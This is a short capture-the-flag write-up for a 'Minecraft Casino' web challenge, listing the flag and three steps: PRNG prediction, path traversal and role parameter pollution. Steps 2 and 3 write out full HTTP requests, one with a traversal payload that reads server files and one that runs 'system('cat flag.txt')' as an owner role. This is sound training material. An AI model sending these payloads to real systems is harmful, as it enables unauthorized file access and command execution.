# Minecraft Casino Writeup

**Flag:** `CTF{19b27d8e42d36b90bf1065733eb0c4b96b59004e0d20269da1ba9bd8c0da213f}`

**Tags:** PRNG Predictability , path traversal, Parameter Pollution

---

## Step 1: PRNG Predictability (The "Rigged" Roulette)

```
POST /api/gamble 
```

Standard PRNGs are linear. If an attacker records the outcomes of 50 consecutive low-stake rolls, they can use an algorithm to determine the seed or the current internal state of the generator. Once known, the attacker can calculate exactly how many more clicks are needed until the "the big win" occurs.

## Step 2: Path Traversal (Accessing the Server Vault)

A Path Traversal vulnerability occurs when the web interface allows a user to "reach" outside the intended folder.

POST /api/shop/buy HTTP/1.1
Host: minecraft-casino
Content-Length: 23
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: session=e20af8c27a353fb77f83df074a5ff3b94b42338c937f2da2e98e5bc40b0cbf9b
Connection: keep-alive

{"itemId":"../../../../../../../../var/www/html/server.properties","amount":1}

Use this vulnerability to read server source code.
---

## Step 3: Parameter Pollution (Role)

Use the parameter pollution in '/god' to execute commands only a superior role has acces to.

POST /god?role=owner HTTP/1.1
Host: minecraft-casino
Content-Length: 23
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: session=e20af8c27a353fb77f83df074a5ff3b94b42338c937f2da2e98e5bc40b0cbf9b
Connection: keep-alive

{"cmd":"system('cat flag.txt')"}
---
